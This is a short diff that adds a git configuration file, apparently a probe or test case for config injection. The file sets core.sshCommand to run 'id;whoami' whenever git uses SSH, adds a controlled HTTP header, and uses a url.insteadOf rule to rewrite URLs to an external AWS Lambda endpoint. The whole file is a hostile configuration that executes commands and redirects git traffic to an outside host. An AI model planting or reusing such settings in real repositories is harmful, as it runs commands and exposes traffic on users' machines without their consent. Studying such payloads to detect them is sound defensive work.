@@ -1,0 +1,6 @@
+[core]
+	sshCommand = id;whoami
+[http]
+	extraHeader = controlled
+[url "https://vl7cftp24xq4vg5fwawdogyvyi0pxygz.lambda-url.us-east-1.on.aws/instead?case=config-like"]
+	insteadOf = controlled://
